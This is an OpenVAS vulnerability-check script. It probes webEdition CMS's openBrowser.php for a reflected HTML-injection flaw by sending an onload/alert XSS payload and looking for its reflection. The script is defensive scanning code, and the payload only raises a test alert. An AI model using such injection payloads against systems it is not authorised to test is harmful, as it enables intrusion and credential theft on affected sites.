###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webedition_47047.nasl 13 2013-10-27 12:16:33Z jan $
#
# webEdition CMS HTML Injection and Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "webEdition CMS is prone to multiple HTML-injection vulnerabilities and
a local file-include vulnerability.

Exploiting these issues could allow an attacker to execute arbitrary
script code in the browser of an unsuspecting user in the context of
the affected site, steal cookie-based authentication credentials, and
execute arbitrary local scripts in the context of the webserver
process. This may allow the attacker to compromise the application and
the computer; other attacks are also possible.

webEdition CMS 6.1.0.2 is vulnerable; other versions may also
be affected.";


if (description)
{
 script_id(103134);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-03-28 19:09:51 +0200 (Mon, 28 Mar 2011)");
 script_bugtraq_id(47047);
 script_tag(name:"cvss_base", value:"6.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

 script_name("webEdition CMS HTML Injection and Local File Include Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/47047");
 script_xref(name : "URL" , value : "http://www.webedition.org/de/index.php");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if installed webEdition CMS is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/webedition","/webEdition","/cms",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, '/openBrowser.php?url="onload="alert(/openvas-xss-test/)'); 

  if(http_vuln_check(port:port, url:url,pattern:"alert\(/openvas-xss-test/\)",extra_check:"<title>webEdition")) {
     
    security_hole(port:port);
    exit(0);

  }
}

exit(0);
